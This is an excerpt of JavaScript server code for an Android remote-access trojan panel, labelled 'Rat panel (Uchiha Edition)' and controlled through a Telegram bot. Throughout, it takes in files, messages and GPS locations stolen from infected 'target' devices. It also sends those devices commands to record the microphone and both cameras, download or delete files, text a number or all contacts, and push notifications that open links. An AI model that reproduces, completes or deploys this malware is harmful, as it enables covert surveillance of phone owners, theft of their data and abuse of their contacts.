...
app.use(express.urlencoded({ extended: true })); // Added for better body parsing
...
app.post("/uploadFile", upload.single('file'), (req, res) => {
    ...
    const modelName = req.headers.model || 'Unknown Device';
    
    appBot.sendDocument(id, req.file.buffer, {
            caption: ROMEO_HEADER + `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${modelName}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: req.file.mimetype || 'application/octet-stream', // Fixed content type issue
        }).catch(err => console.error("File upload error:", err.message));
    res.send('');
});

app.post("/uploadText", (req, res) => {
    const modelName = req.headers.model || 'Unknown Device';
    const textData = req.body['text'] || 'Empty text data';
    appBot.sendMessage(id, ROMEO_HEADER + `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${modelName}</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n` + textData, {parse_mode: "HTML"}).catch(err => console.error(err.message));
    res.send('');
});
...
app.post("/uploadLocation", (req, res) => {
    ...
    if(req.body['lat'] && req.body['lon']) {
        appBot.sendLocation(id, req.body['lat'], req.body['lon']).catch(err => console.error(err.message));
    }
    appBot.sendMessage(id, ROMEO_HEADER + `°• 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙧𝙤𝙢 <b>${modelName}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`, {parse_mode: "HTML"}).catch(err => console.error(err.message));
    res.send('');
});
...
appBot.on('message', (message) => {
    ...
    if (message.reply_to_message) {
        ...
        if (message.reply_to_message.text.includes('°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) ws.send(`send_message:${currentNumber}/${message.text}`);
            });
            currentNumber = '';
            currentUuid = '';
            appBot.sendMessage(id, LOADING_MSG, { parse_mode: "HTML", reply_markup: { keyboard: [["🩸 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 👁️"], ["⚔️ 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]], resize_keyboard: true } });
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) ws.send(`send_message_to_all:${message.text}`);
            });
            currentUuid = '';
            appBot.sendMessage(id, LOADING_MSG, { parse_mode: "HTML", reply_markup: { keyboard: [["🩸 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 👁️"], ["⚔️ 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]], resize_keyboard: true } });
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) ws.send(`file:${message.text}`);
            });
            currentUuid = '';
            appBot.sendMessage(id, LOADING_MSG, { parse_mode: "HTML", reply_markup: { keyboard: [["🩸 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 👁️"], ["⚔️ 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]], resize_keyboard: true } });
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) ws.send(`delete_file:${message.text}`);
            });
            currentUuid = '';
            appBot.sendMessage(id, LOADING_MSG, { parse_mode: "HTML", reply_markup: { keyboard: [["🩸 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 👁️"], ["⚔️ 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]], resize_keyboard: true } });
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) ws.send(`microphone:${message.text}`);
            });
            currentUuid = '';
            appBot.sendMessage(id, LOADING_MSG, { parse_mode: "HTML", reply_markup: { keyboard: [["🩸 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 👁️"], ["⚔️ 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]], resize_keyboard: true } });
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) ws.send(`rec_camera_main:${message.text}`);
            });
            currentUuid = '';
            appBot.sendMessage(id, LOADING_MSG, { parse_mode: "HTML", reply_markup: { keyboard: [["🩸 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 👁️"], ["⚔️ 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]], resize_keyboard: true } });
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙨𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) ws.send(`rec_camera_selfie:${message.text}`);
            });
            currentUuid = '';
            appBot.sendMessage(id, LOADING_MSG, { parse_mode: "HTML", reply_markup: { keyboard: [["🩸 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 👁️"], ["⚔️ 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]], resize_keyboard: true } });
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙤𝙣 𝙩𝙝𝙚 𝙩𝙖𝙧𝙜𝙚𝙩 𝙙𝙚𝙫𝙞𝙘𝙚')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) ws.send(`toast:${message.text}`);
            });
            currentUuid = '';
            appBot.sendMessage(id, LOADING_MSG, { parse_mode: "HTML", reply_markup: { keyboard: [["🩸 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 👁️"], ["⚔️ 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]], resize_keyboard: true } });
        }
        ...
        if (message.reply_to_message.text.includes('°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) ws.send(`show_notification:${currentTitle}/${message.text}`);
            });
            currentUuid = '';
            appBot.sendMessage(id, LOADING_MSG, { parse_mode: "HTML", reply_markup: { keyboard: [["🩸 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 👁️"], ["⚔️ 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]], resize_keyboard: true } });
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙥𝙡𝙖𝙮')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) ws.send(`play_audio:${message.text}`);
            });
            currentUuid = '';
            appBot.sendMessage(id, LOADING_MSG, { parse_mode: "HTML", reply_markup: { keyboard: [["🩸 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 👁️"], ["⚔️ 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]], resize_keyboard: true } });
        }
    ...
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                ROMEO_HEADER +
                '°• 𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 𝙍𝙖𝙩 𝙥𝙖𝙣𝙚𝙡 (𝙐𝙘𝙝𝙞𝙝𝙖 𝙀𝙙𝙞𝙩𝙞𝙤𝙣) 🔥\n\n' +
        ...
        if (message.text == '🩸 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 👁️') {
        ...
        if (message.text == '⚔️ 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    ROMEO_HEADER +
                    '°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚\n\n' +
                ...
                appClients.forEach(function (value, key, map) {
                    // THIS LINE FIXED THE 400 BAD REQUEST ERROR (value.model fallback)
                    deviceListKeyboard.push([{
                        text: value.model ? value.model : 'Unknown Device',
...
appBot.on("callback_query", (callbackQuery) => {
    ...
    if (commend == 'device') {
        const selectedDevice = appClients.get(uuid);
        const deviceModelName = selectedDevice ? selectedDevice.model : 'Unknown';
        
        appBot.editMessageText(ROMEO_HEADER + `°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙘𝙤𝙢𝙢𝙚𝙣𝙙 𝙛𝙤𝙧 𝙙𝙚𝙫𝙞𝙘𝙚 : <b>${deviceModelName}</b>`, {
            chat_id: id,
    ...
    // Process direct commands without user input
    ...
    if (directCommands.includes(commend)) {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) ws.send(commend);
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id, LOADING_MSG, { parse_mode: "HTML", reply_markup: { keyboard: [["🩸 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 👁️"], ["⚔️ 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]], resize_keyboard: true } });
    }

    // Process commands needing user input
    ...
    if (commend == 'send_message_to_all') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id, ROMEO_HEADER + '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨\n\n' +
            '• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
            {reply_markup: {force_reply: true}});
        currentUuid = uuid;
    }
    if (commend == 'file') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id, ROMEO_HEADER + '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙\n\n' +
    ...
    if (commend == 'delete_file') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id, ROMEO_HEADER + '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚\n\n' +
    ...
    if (commend == 'microphone') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id, ROMEO_HEADER + '°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙\n\n' +
    ...
    if (commend == 'toast') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id, ROMEO_HEADER + '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙤𝙣 𝙩𝙝𝙚 𝙩𝙖𝙧𝙜𝙚𝙩 𝙙𝙚𝙫𝙞𝙘𝙚\n\n' +
    ...
    if (commend == 'show_notification') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id, ROMEO_HEADER + '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣\n\n' +
    ...
    if (commend == 'play_audio') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id, ROMEO_HEADER + '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙥𝙡𝙖𝙮\n\n' +
